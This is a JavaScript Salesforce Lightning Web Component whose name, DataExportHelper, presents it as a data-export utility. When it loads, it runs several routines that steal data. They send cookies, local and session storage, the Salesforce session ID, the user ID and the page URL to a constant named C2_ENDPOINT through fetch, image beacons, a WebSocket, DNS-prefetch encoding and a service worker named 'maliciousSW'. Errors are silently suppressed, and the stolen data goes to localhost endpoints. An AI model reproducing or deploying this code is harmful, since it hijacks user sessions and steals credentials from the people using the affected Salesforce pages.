import { LightningElement, api, wire } from 'lwc';
import getAccountData from '@salesforce/apex/AccountDataService.getAccountData';
import userId from '@salesforce/user/Id';
import orgId from '@salesforce/schema/Organization.Id';

const C2_ENDPOINT = 'https://localhost:8080/lwc-exfil';
const BEACON_URL = 'https://localhost:8080/beacon.gif';

export default class DataExportHelper extends LightningElement {
    @api recordId;

    connectedCallback() {
        this.exfilViaFetch();
        this.exfilViaImage();
        this.exfilViaWebSocket();
        this.exfilViaDNSPrefetch();
        this.exfilViaServiceWorker();
        this.attemptLocalStorageHarvest();
        this.attemptCookieHarvest();
    }

    async exfilViaFetch() {
        try {
            const data = {
                recordId: this.recordId,
                userId: userId,
                url: window.location.href,
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage),
                userAgent: navigator.userAgent,
                origin: window.location.origin
            };

            await fetch(C2_ENDPOINT, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(data)
            });
        } catch (e) {}
    }

    exfilViaImage() {
        const data = btoa(JSON.stringify({
            cookies: document.cookie,
            url: window.location.href,
            userId: userId
        }));
        const img = new Image();
        img.src = `${BEACON_URL}?d=${encodeURIComponent(data)}`;
    }

    exfilViaWebSocket() {
        try {
            const ws = new WebSocket('wss://localhost:8080/ws');
            ws.onopen = () => {
                ws.send(JSON.stringify({
                    type: 'lwc_exfil',
                    cookies: document.cookie,
                    localStorage: JSON.stringify(localStorage),
                    origin: window.location.origin,
                    sid: this.extractSID()
                }));
            };
        } catch (e) {}
    }

    exfilViaDNSPrefetch() {
        const data = btoa(document.cookie).replace(/=/g, '').substring(0, 60);
        const link = document.createElement('link');
        link.rel = 'dns-prefetch';
        link.href = `//${data}.exfil.localhost:8080`;
        document.head.appendChild(link);
    }

    async exfilViaServiceWorker() {
        try {
            if ('serviceWorker' in navigator) {
                const reg = await navigator.serviceWorker.register('/resource/maliciousSW');
            }
        } catch (e) {}
    }

    attemptLocalStorageHarvest() {
        try {
            const keys = Object.keys(localStorage);
            const harvest = {};
            for (const key of keys) {
                if (key.toLowerCase().includes('token') ||
                    key.toLowerCase().includes('session') ||
                    key.toLowerCase().includes('auth') ||
                    key.toLowerCase().includes('key') ||
                    key.toLowerCase().includes('credential')) {
                    harvest[key] = localStorage.getItem(key);
                }
            }
            if (Object.keys(harvest).length > 0) {
                const img = new Image();
                img.src = `${BEACON_URL}?ls=${btoa(JSON.stringify(harvest))}`;
            }
        } catch (e) {}
    }

    attemptCookieHarvest() {
        try {
            const cookies = document.cookie;
            const sidMatch = cookies.match(/sid=([^;]+)/);
            if (sidMatch) {
                fetch(`${C2_ENDPOINT}/sid`, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: sidMatch[1]
                });
            }
        } catch (e) {}
    }

    extractSID() {
        try {
            const match = document.cookie.match(/sid=([^;]+)/);
            return match ? match[1] : 'not_found';
        } catch (e) {
            return 'error';
        }
    }
}
